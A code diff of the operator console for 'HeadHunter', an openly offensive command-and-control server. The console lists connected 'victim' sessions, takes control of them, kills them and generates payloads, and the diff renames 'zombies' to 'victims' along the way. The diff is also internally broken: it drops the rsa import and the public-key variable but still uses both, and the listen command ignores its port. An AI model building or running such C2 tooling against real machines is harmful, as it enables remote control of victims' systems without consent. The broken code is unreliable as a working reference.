@@ -1,16 +1,20 @@
 # HeadHunter (C2) server
 # Author: Logan Goins
-# Contributor: 0d1nss0n
+# Contributor: HullaBrian, 0d1nss0n
 # I am not liable for any misuse of this software.
 # This software is for educational purposes only
 
-from src import server
-from src import generate
 import sys
-import rsa
 import os
 
+from dataclasses import dataclass
+
+from src.server import Server
+from src.generate import generate
+
+
 # ANSI escape codes for text colors
+@dataclass
 class Color:
     RED = "\033[91m"
     GREEN = "\033[92m"
@@ -18,8 +22,10 @@ class Color:
     BLUE = "\033[94m"
     RESET = "\033[0m"
 
-def print_colored(text, color):
+
+def print_colored(text, color) -> None:
     print(f"{color}{text}{Color.RESET}")
+
 
 print(
     f'''
@@ -39,7 +45,7 @@ print(
 {Color.RESET}
 Command and Control Server (C2)
 {Color.YELLOW}Author: Logan Goins 
-{Color.BLUE}Contributors: 0d1nss0n
+{Color.BLUE}Contributors: HullaBrian, 0d1nss0n
 
 {Color.RESET}type "help" for available commands
 ''')
@@ -47,7 +53,7 @@ Command and Control Server (C2)
 
 while True:
     command = input(f"{Color.RED}HeadHunter /> {Color.RESET}").lower().split(" ")
-    print(" ")
+    print("")
 
     if len(command) >= 3:
         cmd = command[0]
@@ -61,15 +67,12 @@ while True:
         params = [cmd]
 
     if cmd == "listen":
-        try:
-            server.listen(int(subcmd))
-        except NameError:
-            print("Error: please supply a port number for the server to listen on\n")
+        server = Server()
     elif cmd == "generate":
         # Create the payload output folder if it does not exist
         if not os.path.exists('output'):
             os.makedirs('output')
-        generate.generate()
+        generate()
     elif cmd == "help":
         print(f'''
         Commands
@@ -85,40 +88,39 @@ while True:
     elif cmd == "control":
         try:
             session_number = int(subcmd)
-            zombie = server.zombies[session_number - 1].c
-            zombiepubkey = server.zombies[session_number - 1].public_partner
+            zombie = server.victims[session_number - 1].c
             zombie.send(rsa.encrypt(str.encode("\n"), zombiepubkey))
-            print(f"Entering control mode for zombie " + subcmd + " on address " + str(
+            print(f"Entering control mode for victim " + subcmd + " on address " + str(
                 zombie.getpeername()) + "\n")
             server.control(zombie, zombiepubkey)
         except OSError:
-            print(f"{Color.YELLOW}Zombie is currently disconnected on selected session {Color.RESET}\n")
+            print(f"{Color.YELLOW}Victim is currently disconnected on selected session {Color.RESET}\n")
         except IndexError:
-            print(f"{Color.YELLOW}Zombie does not exist {Color.RESET}\n")
+            print(f"{Color.YELLOW}Victim does not exist {Color.RESET}\n")
     elif cmd == "kill":
         try:
             session_number = int(subcmd)
-            if 1 <= session_number <= len(server.zombies):
-                zombie = server.zombies[session_number - 1].c
-                zombie.close()
-                print(f"{Color.BLUE}Killed zombie session {session_number}{Color.RESET}\n")
+            if 1 <= session_number <= len(server.victims):
+                victim_fd = server.victims[session_number - 1].c
+                victim_fd.close()
+                print(f"{Color.BLUE}Killed victim session {session_number}{Color.RESET}\n")
             else:
-                print(f"{Color.YELLOW}Zombie does not exist {Color.RESET}\n")
+                print(f"{Color.YELLOW}Victim does not exist {Color.RESET}\n")
         except ValueError:
-            print(f"{Color.YELLOW}Zombie does not exist {Color.RESET}\n")
+            print(f"{Color.YELLOW}Victim does not exist {Color.RESET}\n")
     elif cmd == "show" and subcmd == "connections":
         try:
             session = 0
-            for i in server.zombies:
-                if i is not None:
+            for victim_fd in server.victims:
+                if victim_fd is not None:
                     session += 1
                     print(
-                        f"session " + str(session) + " connected on address: " + str(i.c.getpeername()) + "")
+                        f"session " + str(session) + " connected on address: " + str(victim_fd.c.getpeername()) + "")
             print()
         except AttributeError:
             print(f"{Color.YELLOW}Server hasn't started yet. Type \"listen <LHOST> <LPORT>\" to start listening for connections {Color.RESET}\n")
         except OSError:
-            print(f"{Color.YELLOW}No zombies are currently connected {Color.RESET}\n")
+            print(f"{Color.YELLOW}No victim are currently connected {Color.RESET}\n")
     elif cmd == "exit":
         exit()
     elif cmd.strip(" ") == "":
